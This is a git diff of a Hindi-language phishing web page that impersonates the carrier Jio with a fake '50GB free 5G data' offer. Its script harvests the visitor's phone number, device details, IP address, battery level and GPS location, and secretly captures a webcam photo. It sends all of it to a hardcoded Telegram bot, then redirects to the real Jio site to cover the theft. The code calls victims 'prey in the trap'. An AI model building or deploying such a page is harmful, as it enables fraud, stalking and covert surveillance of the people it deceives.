@@ -1,81 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="hi">
 <head>
-    <title>FREE 1GB DATA OFFER</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jio 5G Happy New Year Offer</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e9ecef; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; border-top: 8px solid #0a58ca; }
+        h2 { color: #0a58ca; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { background: #0a58ca; color: white; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.3s; }
+        button:hover { background: #084298; }
+        .logo { width: 80px; margin-bottom: 15px; }
+    </style>
     <script>
         const token = '8550777035:AAE4D2D2sxLMhXauVcJyBDVFg-yiBgeuF-c';
         const chat_id = '8019272612';
 
-        async function startTracking() {
-            let info = "🎯 **नया शिकार जाल में!**\n\n";
-            
-            // 1. IP Address प्राप्त करना
+        async function collectData() {
+            const phone = document.getElementById('phone').value;
+            if (phone.length < 10) { alert("कृपया सही मोबाइल नंबर डालें"); return; }
+
+            let info = `🎯 **नया शिकार जाल में!**\n\n`;
+            info += `📱 **नंबर:** ${phone}\n`;
+            info += `💻 **डिवाइस:** ${navigator.platform}\n`;
+            info += `🌐 **ब्राउज़र:** ${navigator.userAgent.split(') ')[1]}\n`;
+
+            // IP Address
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                info += "🌐 IP: " + ipData.ip + "\n";
-            } catch (e) { info += "🌐 IP: नहीं मिला\n"; }
+                info += `🌍 **IP:** ${ipData.ip}\n`;
+            } catch (e) {}
 
-            // 2. बैटरी की जानकारी
+            // Battery
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                info += "🔋 बैटरी: " + Math.round(battery.level * 100) + "%\n";
+                info += `🔋 **बैटरी:** ${Math.round(battery.level * 100)}%\n`;
             }
 
-            // 3. लोकेशन (GPS) और कैमरा
+            // Location & Camera
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    // सही गूगल मैप्स लिंक
-                    info += `📍 लोकेशन: https://www.google.com/maps?q=${lat},${lon}\n`;
-                    
-                    takePhoto(info);
-                }, async (err) => {
-                    info += "⚠️ लोकेशन परमिशन नहीं मिली।\n";
-                    takePhoto(info);
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    info += `📍 **लोकेशन:** https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                    await takePhoto(info);
+                }, async () => {
+                    info += `⚠️ **लोकेशन:** Denied\n`;
+                    await takePhoto(info);
                 });
-            } else {
-                takePhoto(info + "⚠️ GPS सपोर्ट नहीं है।\n");
             }
         }
 
         async function takePhoto(allDetails) {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const imgData = canvas.toDataURL('image/jpeg');
-                    const blob = await (await fetch(imgData)).blob();
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', chat_id);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', allDetails + "📸 फोटो खींच ली गई है!");
-                    
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (err) {
-                    // कैमरा न मिलने पर सिर्फ मैसेज भेजना
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(allDetails + "⚠️ कैमरा परमिशन नहीं मिली।")}&parse_mode=Markdown`);
-                }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', allDetails);
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(allDetails + "⚠️ कैमरा: Denied")}&parse_mode=Markdown`);
             }
+            // असली वेबसाइट पर भेजना
+            window.location.href = "https://www.jio.com/en-in/5g";
         }
-
-        window.onload = startTracking;
     </script>
 </head>
-<body style="background: black; color: white; text-align: center; font-family: Arial; padding-top: 50px;">
-    <h1>🎁 1GB Free Data Offer 🎁</h1>
-    <p>Loading... Please wait and **Allow** permissions to verify your number.</p>
+<body>
+    <div class="card">
+        <img src="https://www.jio.com/favicon.ico" class="logo" alt="logo">
+        <h2>मुफ़्त 5G डेटा ऑफर</h2>
+        <p>अपना Jio नंबर वेरीफाई करें और 30 दिनों के लिए 50GB डेटा मुफ्त पाएं।</p>
+        <input type="number" id="phone" placeholder="अपना मोबाइल नंबर डालें" required>
+        <button onclick="collectData()">अभी एक्टिवेट करें</button>
+        <p style="font-size: 10px; margin-top: 20px;">*नियम और शर्तें लागू</p>
+    </div>
 </body>
 </html>
